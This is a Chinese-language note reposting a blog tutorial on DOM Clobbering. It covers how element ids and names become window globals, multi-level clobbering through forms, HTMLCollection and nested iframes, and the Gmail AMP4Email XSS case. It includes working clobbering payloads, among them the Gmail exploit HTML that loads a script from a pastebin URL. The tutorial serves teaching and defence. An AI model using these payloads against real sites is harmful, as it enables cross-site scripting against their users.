---
aliases: []
tags: ['Security','date/2022-11','year/2022','month/11']
date: 2022-11-08-星期二 17:19:29
update: 2022-11-09-星期三 15:17:25
---

[原文](https://blog.huli.tw/2021/01/23/dom-clobbering/)

## 前言

在正式开始之前，先给大家一个趣味题目小试身手。

假设你有一段代码，有一个按钮以及一段 script，如下所示：

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <button id="btn">click me</button>
  <script>
    // TODO: add click event listener to button
  </script>
</body>
</html>
```

现在请你尝试用「最短的代码」，实现出「点下按钮时会跳出 alert(1)」这个功能。

举例来说，这样写可以达成目标：

```js
document.getElementById('btn')
  .addEventListener('click', () => {
    alert(1)
  })
```

那如果要讓程序碼最短，你的答案會是什麼？

大家可以在往下看以前先想一下這個問題，想好以後就讓我們正式開始吧！

防雷

.

.

.

.

.

.

.

.

.

.

.

.

.

## DOM 与 window 的量子纠缠

你知道 DOM 里面的东西，有可能影响到 window 吗？

这个行为是我几年前在脸书的前端社群无意间得知的，那就是你在 HTML 里面设定一个有 id 的元素之后，在 JS 里面就可以直接存取到它：

```html
<button id="btn">click me</button>
<script>
  console.log(window.btn) // <button id="btn">click me</button>
</script>
```

然后因为 JS 的 scope，所以你就算直接用 `btn` 也可以，因为当前的 scope 找不到就会往上找，一路找到 window。

所以开头那题，答案是：

```js
btn.onclick = () => alert(1)
```

不需要 getElementById，也不需要 querySelector，只要直接用跟 id 同名的变数去拿，就可以拿得到。

而这个行为是有明确定义在 spec 上的，在 [7.3.3 Named access on the Window object](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)：

![](_attachment/img/Pasted image 20221108184725.png)

帮大家节录两个重点：

1. the value of the name content attribute for all `embed`, `form`, `img`, and `object` elements that have a non-empty name content attribute

2. the value of the id content attribute for all HTML elements that have a non-empty id content attribute

也就是说除了 id 可以直接用 window 存取到以外，`embed`, `form`, `img` 跟 `object` 这四个 tag 用 name 也可以存取到：

```html
<embed name="a"></embed>
<form name="b"></form>
<img name="c" />
<object name="d"></object>
```

但是知道这个有什么用呢？有，理解这个规格之后，我们可以得出一个结论：

> 我们是有机会透过 HTML 元素来影响 JS 的

而这个手法用在攻击上，就是标题的 DOM Clobbering。之前是因为这个攻击才第一次听到 clobbering 这个单字的，去查一下发现在 CS 领域中有覆盖的意思，就是透过 DOM 把一些东西覆盖掉以达成攻击的手段。

## DOM Clobbering 入门

那在什么场景之下有机会用 DOM Clobbering 攻击呢？

首先，你必须有机会在页面上显示你自订的 HTML，否则就没有办法了。所以一个可以攻击的场景可能会像是这样：

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h1>留言板</h1>
  <div>
    你的留言：哈囉大家好
  </div>
  <script>
    if (window.TEST_MODE) {
      // load test script
      var script = document.createElement('script')
      script.src = window.TEST_SCRIPT_SRC
      document.body.appendChild(script)
    }
  </script>
</body>
</html>
```

假设现在有一个留言板，你可以输入任意内容，但是你的输入在 server 端会透过 [DOMPurify](https://github.com/cure53/DOMPurify) 来做处理，把任何可以执行 JavaScript 的东西给拿掉，所以 `<script></script>` 会被删掉，`<img src=x onerror=alert(1)>` 的 `onerror` 会被拿掉，还有许多 XSS payload 都没有办法过关。

简而言之，你没办法执行 JavaScript 来达成 XSS，因为这些都被过滤掉了。

但是因为种种因素，并不会过滤掉 HTML 标签，所以你可以做的事情是显示自订的 HTML。只要没有执行 JS，你想要插入什么 HTML 标签，设置什么属性都可以。

所以呢，你可以这样做：

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h1>留言板</h1>
  <div>
    你的留言：<div id="TEST_MODE"></div>
    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
  </div>
  <script>
    if (window.TEST_MODE) {
      // load test script
      var script = document.createElement('script')
      script.src = window.TEST_SCRIPT_SRC
      document.body.appendChild(script)
    }
  </script>
</body>
</html>
```

根据我们上面所得到的知识，可以插入一个 id 是 TEST_MODE 的标签 `<div id="TEST_MODE"></div>`，这样底下 JS 的 `if (window.TEST_MODE)` 就会过关，因为 `window.TEST_MODE` 会是这个 div 元素。

再来我们可以用 `<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>`，来让 `window.TEST_SCRIPT_SRC` 转成字串之后变成我们想要的字。

在大多数的状况中，只是把一个变数覆盖成 HTML 元素是不够的，例如说你把上面那段代码当中的 `window.TEST_MODE` 转成字串印出来：

```js
// <div id="TEST_MODE" />
console.log(window.TEST_MODE + '')
```

结果会是：`[object HTMLDivElement]`。

把一个 HTML 元素转成字串就是这样，会变成这种形式，如果是这样的话那基本上没办法利用。但幸好在 HTML 里面有两个元素在 toString 的时候会做特殊处理：`<base>` 跟 `<a>`：

![](_attachment/img/Pasted image 20221109143255.png)

来源：[4.6.3 API for a and area elements](https://html.spec.whatwg.org/#api-for-a-and-area-elements)

这两个元素在 toString 的时候会回传 URL，而我们可以透过 href 属性来设置 URL，就可以让 toString 之后的内容可控。

所以综合以上手法，我们学到了：

1. 用 HTML 搭配 id 属性影响 JS 变数

2. 用 a 搭配 href 以及 id 让元素 toString 之后变成我们想要的值

透过上面这两个手法再搭配适合的场景，就有机会利用 DOM Clobbering 来做攻击。

不过这边要提醒大家一件事，如果你想攻击的变数已经存在的话，你用 DOM 是覆盖不掉的，例如说：

```html
<!DOCTYPE html>
<html>
<head>
  <script>
    TEST_MODE = 1
  </script>
</head>
<body>
  <div id="TEST_MODE"></div>
  <script>
    console.log(window.TEST_MODE) // 1
  </script>
</body>
</html>
```

## 多层级的 DOM Clobbering

在前面的范例中，我们用 DOM 把 `window.TEST_MODE` 盖掉，创造出未预期的行为。那如果要盖掉的对象是个对象，有机会吗？

例如说 `window.config.isTest`，这样也可以用 DOM clobbering 盖掉吗？

有几种方法可以盖掉，第一种是利用 HTML 标签的层级关系，具有这样特性的是 form，表单这个元素：

在 HTML 的 [spec](https://www.w3.org/TR/html52/sec-forms.html) 中有这样一段：

![](_attachment/img/Pasted image 20221109143517.png)

可以利用 `form[name]` 或是 `form[id]` 去拿它底下的元素，例如说：

```html
<!DOCTYPE html>
<html>
<body>
  <form id="config">
    <input name="isTest" />
    <button id="isProd"></button>
  </form>
  <script>
    console.log(config) // <form id="config">
    console.log(config.isTest) // <input name="isTest" />
    console.log(config.isProd) // <button id="isProd"></button>
  </script>
</body>
</html>
```

如此一来就可以构造出两层的 DOM clobbering。不过有一点要注意，那就是这边没有 a 可以用，所以 toString 之后都会变成没办法利用的形式。

这边比较有可能利用的机会是，当你要覆盖的东西是用 `value` 存取的时候，例如说：`config.enviroment.value`，就可以利用 input 的 value 属性做覆盖：

```html
<!DOCTYPE html>
<html>
<body>
  <form id="config">
    <input name="enviroment" value="test" />
  </form>
  <script>
    console.log(config.enviroment.value) // test
  </script>
</body>
</html>
```

简单来说呢，就是只有那些内建的属性可以覆盖，其他是没有办法的。

除了利用 HTML 本身的层级以外，还可以利用另外一个特性：HTMLCollection。

在我们稍早看到的关于 `Named access on the Window object` 的 spec 当中，决定值是什么的段落是这样写的：

![](_attachment/img/Pasted image 20221109144207.png)

如果要回传的东西有多个，就回传 HTMLCollection。

```html
<!DOCTYPE html>
<html>
<body>
  <a id="config"></a>
  <a id="config"></a>
  <script>
    console.log(config) // HTMLCollection(2)
  </script>
</body>
</html>
```

那有了 HTMLCollection 之后可以做什么呢？在 [4.2.10.2. Interface HTMLCollection](https://dom.spec.whatwg.org/#interface-htmlcollection) 中有写到，可以利用 name 或是 id 去拿 HTMLCollection 里面的元素。

![](_attachment/img/Pasted image 20221109144517.png)

像是这样：

```html
<!DOCTYPE html>
<html>
<body>
  <a id="config"></a>
  <a id="config" name="apiUrl" href="https://huli.tw"></a>
  <script>
    console.log(config.apiUrl + '')
    // https://huli.tw
  </script>
</body>
</html>
```

就可以透过同名的 id 产生出 HTMLCollection，再用 name 来抓取 HTMLCollection 的特定元素，一样可以达到两层的效果。

而如果我们把 form 跟 HTMLCollection 结合在一起，就能够达成三层：

```html
<!DOCTYPE html>
<html>
<body>
  <form id="config"></form>
  <form id="config" name="prod">
    <input name="apiUrl" value="123" />
  </form>
  <script>
    console.log(config.prod.apiUrl.value) //123
  </script>
</body>
</html>
```

先利用同名的 id，让 `config` 可以拿到 HTMLCollection，再来用 `config.prod` 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那个 form，接着就是 `form.apiUrl` 拿到表单底下的 input，最后用 value 拿到里面的属性。

所以如果最后要拿的属性是 HTML 的属性，就可以四层，否则的话就只能三层。

## 再更多层级的 DOM Clobbering

前面提到三层或是有条件的四层已经是极限了，那有没有办法再突破限制呢？

根据 [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back) 里面给的做法，有，利用 iframe 就可以达到！

当你建了一个 iframe 并且给它一个 name 的时候，用这个 name 就可以指到 iframe 里面的 window，所以可以像这样：

```html
<!DOCTYPE html>
<html>
<body>
  <iframe name="config" srcdoc='
    <a id="apiUrl"></a>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(config.apiUrl) // <a id="apiUrl"></a>
    }, 500)
  </script>
</body>
</html>
```

这边之所以会需要 setTimeout 是因为 iframe 并不是同步载入的，所以需要一些时间才能正确抓到 iframe 里面的东西。

有了 iframe 的帮助之后，就可以创造出更多层级：

```html
<!DOCTYPE html>
<html>
<body>
  <iframe name="moreLevel" srcdoc='
    <form id="config"></form>
    <form id="config" name="prod">
      <input name="apiUrl" value="123" />
    </form>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(moreLevel.config.prod.apiUrl.value) //123
    }, 500)
  </script>
</body>
</html>
```

理论上你可以在 iframe 里面再用一个 iframe，就可以达成无限多层级的 DOM clobbering，不过我试了一下发现可能有点编码的问题需要处理，例如说像是这样：

```html
<!DOCTYPE html>
<html>
<body>
  <iframe name="level1" srcdoc='
    <iframe name="level2" srcdoc="
      <iframe name="level3"></iframe>
    "></iframe>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(level1.level2.level3) // undefined
    }, 500)
  </script>
</body>
</html>
```

印出来会是 undefined，但如果把 level3 的那两个双引号拿掉，直接写成 `name=level3` 就可以成功印出东西来，我猜是因为单引号双引号的一些解析问题造成的，目前还没找到什么解法，只尝试了这样是 ok 的，但是再往下就出错了：

```html
<!DOCTYPE html>
<html>
<body>
  <iframe name="level1" srcdoc="
    <iframe name=&quot;level2&quot; srcdoc=&quot;
      <iframe name='level3' srcdoc='
        <iframe name=level4></iframe>
      '></iframe>
    &quot;></iframe>
  "></iframe>
  <script>
    setTimeout(() => {
      console.log(level1.level2.level3.level4)
    }, 500)
  </script>
</body>
</html>
```

用这样就可以无限多层了:

```html
<iframe name=a srcdoc="
  <iframe name=b srcdoc=&quot
    <iframe name=c srcdoc=&amp;quot;
      <iframe name=d srcdoc=&amp;amp;quot;
        <iframe name=e srcdoc=&amp;amp;amp;quot;
          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;
            <div id=g>123</div>
          &amp;amp;amp;amp;quot;></iframe>
        &amp;amp;amp;quot;></iframe>
      &amp;amp;quot;></iframe>
    &amp;quot;></iframe>
  &quot></iframe>
"></iframe>
```

## 实际案例研究：Gmail AMP4Email XSS

在 2019 年的时候 Gmail 有一个漏洞就是透过 DOM clobbering 来攻击的，完整的 write up 在这边：[XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)，底下我就稍微讲一下过程（内容都取材自上面这篇文章）。

简单来说呢，在 Gmail 里面你可以使用部分 AMP 的功能，然后 Google 针对这个格式的 validator 很严谨，所以没有办法透过一般的方法 XSS。

但是有人发现可以在 HTML 元素上面设置 id，又发现当他设置了一个 `<a id="AMP_MODE">` 之后，console 突然出现一个载入 script 的错误，而且网址中的其中一段是 undefined。仔细去研究代码之后，有一段代码大概是这样的：

```js
var script = window.document.createElement("script");
script.async = false;

var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation
} else {
    loc = window.location;
}

if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist"
} else {
    loc = "https://cdn.ampproject.org";
}

var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

如果我们能让 `AMP_MODE.test` 跟 `AMP_MODE.localDev` 都是 truthy 的话，再搭配设置 `window.testLocation`，就能够载入任意的 script！

所以 exploit 会长的像这样：

```html
// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>

// 設置 testLocation.protocol
<a id="testLocation"></a>
<a id="testLocation" name="protocol"
   href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

最后就能成功载入任意 script，进而达成 XSS！ （不过当初作者只有试到这一步就被 CSP 挡住了）。

这应该是 DOM Clobbering 最有名的案例之一了。

## 总结

虽然说 DOM Clobbering 的使用场合有限，但真的是个相当有趣的攻击方式！而且如果你不知道这个 feature 的话，可能完全没想过可以透过 HTML 来影响全域变数的内容。

如果对这个攻击手法有兴趣的，可以参考 PortSwigger 的[文章](https://portswigger.net/web-security/dom-based/dom-clobbering)，里面提供了两个 lab 让大家亲自尝试这个攻击手法，光看是没用的，要实际下去攻击才更能体会。

参考资料：

1. [使用 Dom Clobbering 扩展 XSS](http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships)
2. [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back)
3. [DOM Clobbering Attack学习记录.md](https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
4. [DOM Clobbering学习记录](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
5. [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
6. [Is there a spec that the id of elements should be made global variable?](https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable)
7. [Why don’t we just use element IDs as identifiers in JavaScript?](https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript)
8. [Do DOM tree elements with ids become global variables?](https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables)
